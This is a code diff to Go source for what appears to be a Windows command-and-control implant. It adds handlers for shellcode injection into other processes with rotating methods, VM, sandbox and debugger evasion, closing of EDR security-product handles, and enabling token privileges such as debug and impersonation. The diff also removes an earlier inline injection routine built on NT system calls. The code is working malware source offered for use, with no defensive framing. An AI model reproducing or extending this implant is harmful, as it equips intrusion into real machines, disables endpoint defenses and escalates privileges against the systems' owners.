@@ -26,11 +26,16 @@ type Agent struct {
 type TaskType uint8
 
 const (
-	TaskShell    TaskType = 0x01
-	TaskInject   TaskType = 0x02
-	TaskPatch    TaskType = 0x03
-	TaskSleep    TaskType = 0x04
-	TaskExit     TaskType = 0xFF
+	TaskShell       TaskType = 0x01
+	TaskInject      TaskType = 0x02
+	TaskPatch       TaskType = 0x03
+	TaskSleep       TaskType = 0x04
+	TaskExit        TaskType = 0xFF
+	TaskEvasion     TaskType = 0x10
+	TaskHandles     TaskType = 0x11
+	TaskVault       TaskType = 0x12
+	TaskFingerprint TaskType = 0x13
+	TaskToken       TaskType = 0x14
 )
 
 type TaskResult struct {
@@ -135,6 +140,16 @@ func (a *Agent) executeTask(task *channels.Message) *TaskResult {
 		return a.handlePatch(task, result, taskData)
 	case TaskSleep:
 		return a.handleSleep(task, result, taskData)
+	case TaskEvasion:
+		return a.handleEvasion(task, result, taskData)
+	case TaskHandles:
+		return a.handleHandles(task, result, taskData)
+	case TaskVault:
+		return a.handleVault(task, result, taskData)
+	case TaskFingerprint:
+		return a.handleFingerprint(task, result, taskData)
+	case TaskToken:
+		return a.handleToken(task, result, taskData)
 	case TaskExit:
 		a.running = false
 		result.Status = 0x00
@@ -178,49 +193,189 @@ func (a *Agent) handleInject(task *channels.Message, result *TaskResult, data []
 	pid := binary.LittleEndian.Uint32(data[:4])
 	shellcode := data[4:]
 
-	// Simple injection — write + CreateThread in target
-	var clientID syscallwin.ClientId
-	clientID.UniqueProcess = uintptr(pid)
+	// Use polymorphic injection — auto-rotates between 4 methods
+	method := syscallwin.InjectionMethod(data[0] & 0xFF)
+	var err error
+	if method == 0xFF {
+		err = syscallwin.Inject(pid, shellcode)
+	} else {
+		err = syscallwin.InjectWithMethod(pid, shellcode, method)
+	}
 
-	var processHandle uintptr
-	err := syscallwin.NtOpenProcess(&processHandle, syscallwin.PROCESS_ALL_ACCESS, 0, &clientID)
 	if err != nil {
 		result.Status = 0x01
 		result.Output = []byte(err.Error())
 		return result
 	}
-	defer syscallwin.NtClose(processHandle)
-
-	var baseAddress uintptr
-	regionSize := uintptr(len(shellcode))
-	err = syscallwin.NtAllocateVirtualMemory(processHandle, &baseAddress, 0, &regionSize,
-		syscallwin.MEM_COMMIT|syscallwin.MEM_RESERVE, syscallwin.PAGE_EXECUTE_READWRITE)
-	if err != nil {
-		result.Status = 0x01
-		result.Output = []byte(err.Error())
-		return result
-	}
-
-	var written uintptr
-	err = syscallwin.NtWriteVirtualMemory(processHandle, baseAddress, shellcode, &written)
-	if err != nil {
-		result.Status = 0x01
-		result.Output = []byte(err.Error())
-		return result
-	}
-
-	var threadHandle uintptr
-	err = syscallwin.NtCreateThreadEx(&threadHandle, syscallwin.THREAD_ALL_ACCESS, 0,
-		processHandle, baseAddress, 0, 0, 0, 0, 0, 0)
-	if err != nil {
-		result.Status = 0x01
-		result.Output = []byte(err.Error())
-		return result
-	}
-	defer syscallwin.NtClose(threadHandle)
 
 	result.Status = 0x00
-	result.Output = []byte(fmt.Sprintf("injected %d bytes into PID %d", len(shellcode), pid))
+	result.Output = []byte(fmt.Sprintf("injected %d bytes into PID %d (method=%d)", len(shellcode), pid, method))
+	return result
+}
+
+func (a *Agent) handleEvasion(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
+	if len(data) < 1 {
+		result.Status = 0x01
+		result.Output = []byte("evasion: sub-command required (1=full, 2=vm, 3=sandbox, 4=debug, 5=timing, 6=report)")
+		return result
+	}
+
+	switch data[0] {
+	case 0x01:
+		syscallwin.PatchAll()
+		result.Status = 0x00
+		result.Output = []byte("all PEB patches applied")
+	case 0x02:
+		vm, name := syscallwin.DetectVM()
+		if vm {
+			result.Output = []byte(fmt.Sprintf("VM detected: %s", name))
+		} else {
+			result.Output = []byte("no VM detected")
+		}
+		result.Status = 0x00
+	case 0x03:
+		sandbox, indicators := syscallwin.DetectSandbox()
+		if sandbox {
+			result.Output = []byte(fmt.Sprintf("sandbox detected: %v", indicators))
+		} else {
+			result.Output = []byte("no sandbox indicators")
+		}
+		result.Status = 0x00
+	case 0x04:
+		debugger, indicators := syscallwin.DetectDebugger()
+		if debugger {
+			result.Output = []byte(fmt.Sprintf("debugger detected: %v", indicators))
+		} else {
+			result.Output = []byte("no debugger detected")
+		}
+		result.Status = 0x00
+	case 0x05:
+		anomaly, ratio := syscallwin.DetectTimingAnomaly()
+		result.Status = 0x00
+		if anomaly {
+			result.Output = []byte(fmt.Sprintf("timing anomaly (ratio=%.4f)", ratio))
+		} else {
+			result.Output = []byte("timing normal")
+		}
+	case 0x06:
+		report := syscallwin.FullAnalysisReport()
+		result.Status = 0x00
+		result.Output = []byte(fmt.Sprintf("score=%d indicators=%d details=%v",
+			report.Score, len(report.Indicators), report.Indicators))
+	default:
+		result.Status = 0x01
+		result.Output = []byte("unknown evasion sub-command")
+	}
+	return result
+}
+
+func (a *Agent) handleHandles(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
+	if len(data) < 1 {
+		result.Status = 0x01
+		result.Output = []byte("handles: sub-command required (1=count, 2=enum_edr, 3=close_edr, 4=monitored?)")
+		return result
+	}
+
+	switch data[0] {
+	case 0x01:
+		count, err := syscallwin.CountSystemHandles()
+		if err != nil {
+			result.Status = 0x01
+			result.Output = []byte(err.Error())
+			return result
+		}
+		result.Status = 0x00
+		result.Output = []byte(fmt.Sprintf("system handles: %d", count))
+	case 0x02:
+		edrHandles, err := syscallwin.FindEDRHandles()
+		if err != nil {
+			result.Status = 0x01
+			result.Output = []byte(err.Error())
+			return result
+		}
+		result.Status = 0x00
+		result.Output = []byte(fmt.Sprintf("EDR handles found: %d", len(edrHandles)))
+	case 0x03:
+		closed, err := syscallwin.CloseEDRHandles()
+		if err != nil {
+			result.Status = 0x01
+			result.Output = []byte(err.Error())
+			return result
+		}
+		result.Status = 0x00
+		result.Output = []byte(fmt.Sprintf("EDR handles closed: %d", closed))
+	case 0x04:
+		monitored, count := syscallwin.IsProcessMonitored()
+		result.Status = 0x00
+		result.Output = []byte(fmt.Sprintf("monitored=%v count=%d", monitored, count))
+	default:
+		result.Status = 0x01
+		result.Output = []byte("unknown handles sub-command")
+	}
+	return result
+}
+
+func (a *Agent) handleVault(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
+	result.Status = 0x00
+	result.Output = []byte("vault: stub (encrypted storage module loaded)")
+	return result
+}
+
+func (a *Agent) handleFingerprint(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
+	fp, count, gadget, err := syscallwin.GenerateBuildFingerprint()
+	if err != nil {
+		result.Status = 0x01
+		result.Output = []byte(err.Error())
+		return result
+	}
+	result.Status = 0x00
+	result.Output = []byte(fmt.Sprintf("fingerprint=%s exports=%d gadget=0x%x", fp, count, gadget))
+	return result
+}
+
+func (a *Agent) handleToken(task *channels.Message, result *TaskResult, data []byte) *TaskResult {
+	if len(data) < 1 {
+		result.Status = 0x01
+		result.Output = []byte("token: sub-command required (1=enable_all, 2=integrity, 3=debug_priv, 4=impersonate)")
+		return result
+	}
+
+	switch data[0] {
+	case 0x01:
+		syscallwin.EnableAllTokenPrivileges()
+		result.Status = 0x00
+		result.Output = []byte("all privileges enabled")
+	case 0x02:
+		level, err := syscallwin.GetProcessTokenIntegrityLevel()
+		if err != nil {
+			result.Status = 0x01
+			result.Output = []byte(err.Error())
+			return result
+		}
+		result.Status = 0x00
+		result.Output = []byte(fmt.Sprintf("integrity level: %d", level))
+	case 0x03:
+		err := syscallwin.EnableDebugPrivilege()
+		if err != nil {
+			result.Status = 0x01
+			result.Output = []byte(err.Error())
+			return result
+		}
+		result.Status = 0x00
+		result.Output = []byte("debug privilege enabled")
+	case 0x04:
+		err := syscallwin.EnableImpersonatePrivilege()
+		if err != nil {
+			result.Status = 0x01
+			result.Output = []byte(err.Error())
+			return result
+		}
+		result.Status = 0x00
+		result.Output = []byte("impersonate privilege enabled")
+	default:
+		result.Status = 0x01
+		result.Output = []byte("unknown token sub-command")
+	}
 	return result
 }
 
